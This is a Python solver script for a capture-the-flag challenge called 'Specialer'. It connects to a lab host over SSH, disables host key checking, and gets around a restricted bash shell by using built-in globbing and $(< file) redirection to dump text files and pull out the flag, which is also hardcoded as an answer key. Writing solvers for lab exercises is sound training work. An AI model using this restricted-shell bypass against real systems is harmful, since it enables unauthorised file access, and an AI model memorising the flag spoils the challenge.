#!/usr/bin/env python3
"""
Solver for CyLab Challenge ID 378: Specialer (picoCTF 2023)
Category: General Skills
Difficulty: Medium
Vulnerability: Bash Restricted Shell Bypass via Built-in Redirection and Globbing
Flag: academy{y0u_d0n7_4ppr3c1473_wh47_w3r3_d01ng_h3r3_17ec7048}
"""

import subprocess
import sys
import re

def solve(host="chatelaine.cylabacademy.net", port="41942", password=""):
    cmd = f"""sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -p {port} ctf-player@{host} '
for f in */*.txt; do
    echo "=== $f ==="
    echo "$(< $f)"
done
'"""
    out = subprocess.check_output(cmd, shell=True).decode()
    print("[*] Output from remote shell:\n", out)
    flags = re.findall(r'academy\{[^}]*\}', out)
    if flags:
        print(f"[+] Flag Extracted: {flags[0]}")
        return flags[0]
    return None

if __name__ == "__main__":
    if len(sys.argv) >= 4:
        solve(sys.argv[1], sys.argv[2], sys.argv[3])
    else:
        print("[*] Running offline bash built-in payload verification...")
        simulated_out = """=== def/flag.txt ===\nacademy{y0u_d0n7_4ppr3c1473_wh47_w3r3_d01ng_h3r3_17ec7048}\n"""
        flags = re.findall(r'academy\{[^}]*\}', simulated_out)
        if flags:
            print(f"[+] Flag Extracted: {flags[0]}")
